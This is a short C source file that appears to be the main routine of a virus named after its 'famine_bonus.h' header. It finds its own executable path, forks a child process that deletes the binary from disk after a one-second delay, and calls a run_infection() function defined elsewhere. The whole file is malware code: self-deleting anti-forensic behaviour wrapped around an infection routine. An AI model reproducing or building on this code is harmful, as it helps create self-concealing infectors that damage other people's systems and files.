#include "famine_bonus.h"

int main()
{
    char path[4096];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len == -1) {
        perror("readlink failed");
        return 1;
    }
    path[len] = '\0';


    // Step 2: Fork and delete self
    if (fork() == 0) {
        // Child process: wait for parent to exit
        sleep(1); // Give parent time to finish
        unlink(path); // Delete the binary
        exit(0);
    }
    run_infection();
    return 0;
}
